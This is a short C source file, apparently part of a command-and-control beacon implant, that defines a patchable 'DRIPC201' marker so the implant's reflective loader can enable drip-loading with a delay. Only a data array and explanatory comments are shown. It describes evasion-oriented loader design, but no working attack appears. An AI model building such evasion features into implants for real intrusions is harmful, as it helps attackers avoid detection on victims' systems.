/* stage_drip.c - C-56 (4.12 rdll_use_driploading): stage drip-loading boot flag.
 *
 * The marker lives in the beacon image (.data). BeaconPayload patches
 * enable+delay into it per-profile (patchStageDripMarker, ts repo) right
 * after the sleeve read and before sleeve encryption, so the reflective
 * loader (udrl/ReflectiveLoader.c) can honor it BEFORE settings init -
 * the loader runs before the settings TLV table is even parsed.
 *
 * Layout: [8B magic "DRIPC201"][u32 enable][u32 delay ms]. Zeros = off.
 * volatile + non-const so /OPT:REF keeps it in the final image (same
 * discipline as the buildstamp).
 */
volatile unsigned char g_stage_drip[16] = {
	'D', 'R', 'I', 'P', 'C', '2', '0', '1',
	0, 0, 0, 0, /* enable (u32 LE) */
	0, 0, 0, 0  /* delay ms (u32 LE) */
};
